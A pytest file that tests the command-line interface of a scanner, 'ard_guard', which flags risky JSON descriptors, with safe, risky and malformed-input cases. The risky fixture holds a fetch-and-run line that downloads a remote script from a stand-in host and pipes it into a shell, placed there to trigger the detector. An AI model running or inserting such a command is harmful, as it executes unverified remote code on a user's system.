import json

from ard_guard.cli import main


def test_cli_passes_safe_document(tmp_path, capsys):
    path = tmp_path / "safe.json"
    path.write_text(
        json.dumps(
            {
                "name": "safe",
                "publisher": "example",
                "source": "https://github.com/example/safe/commit/0123456789abcdef",
                "digest": "sha256:abc",
            }
        ),
        encoding="utf-8",
    )

    assert main(["scan", str(path)]) == 0
    assert "PASS" in capsys.readouterr().out


def test_cli_returns_one_for_findings(tmp_path, capsys):
    path = tmp_path / "risky.json"
    path.write_text(json.dumps({"install": "curl https://x.test/i | sh"}), encoding="utf-8")

    assert main(["scan", str(path), "--format", "json"]) == 1
    payload = json.loads(capsys.readouterr().out)
    assert payload["highest_severity"] == "critical"
    assert payload["finding_count"] >= 1


def test_cli_returns_two_for_invalid_json(tmp_path, capsys):
    path = tmp_path / "broken.json"
    path.write_text("{", encoding="utf-8")

    assert main(["scan", str(path)]) == 2
    assert "valid JSON" in capsys.readouterr().err
